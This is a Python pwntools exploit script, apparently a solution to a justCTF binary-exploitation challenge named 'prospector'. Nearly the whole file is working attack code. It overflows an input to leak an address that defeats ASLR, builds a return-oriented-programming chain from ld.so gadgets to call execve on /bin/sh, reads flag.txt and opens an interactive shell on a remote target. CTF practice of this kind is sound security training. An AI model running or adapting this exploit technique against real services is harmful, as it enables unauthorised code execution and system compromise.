#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
brva 0x125a
continue
"""

exe = "./prospector_patched"
ld = ELF("./ld-linux-x86-64.so.2")
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

# Helper function deobfus score -> ld address
def recover_a2(score):
    shifted = score // 2  # a2 >> 16

    # Reconstruct the top 48 bits of a2
    top_bits = shifted << 16
    a2 = (0x700000006000) | top_bits
    return a2

io = start()

payload = flat(
    b'\00' * 0x48,
    0x1
    )

sa(b"Nick: ", payload)
recvunt(b"score: ")
score = int(io.recvline().decode())
info("Leaked score: " + str(score))

# ASLR
bss = recover_a2(score)
# ld.address = bss + 0x3000 # Local offset
ld.address = bss + 0x8000 # Remote offset

# No ASLR
# bss = 0x7ffff7fb8000
# ld.address = bss + 0x9000

info("Recovered bss address: " + hex(bss))
info("LD address: " + hex(ld.address))

pop_rdi_rbp = ld.address + 0x0000000000003399 #: pop rdi ; pop rbp ; ret
pop_rsi_rbp = ld.address + 0x0000000000005700 #: pop rsi ; pop rbp ; ret
pop_rdx_leave = ld.address + 0x00000000000217bb #: pop rdx ; leave ; ret
pop_rax = ld.address + 0x0000000000015abb #: pop rax ; ret
syscall = ld.address + 0x000000000000b879

payload = flat(
    b'\x00' * 0x28,
    bss + 0x40,
    b'B' * 8,
    pop_rax,
    bss,
    pop_rdi_rbp,
    bss + 0x40,
    0,
    pop_rsi_rbp,
    0,
    bss + 0x40,
    pop_rax,
    0x3b,
    pop_rdx_leave,
    0,
    )
# input()
sla(b"Color: ", payload)

sla(b"Color: ", b"/bin/sh\00" + p64(syscall))
sl("cat flag.txt")

io.interactive()
#justCTF{sh1n3s_1n_rw_m3m}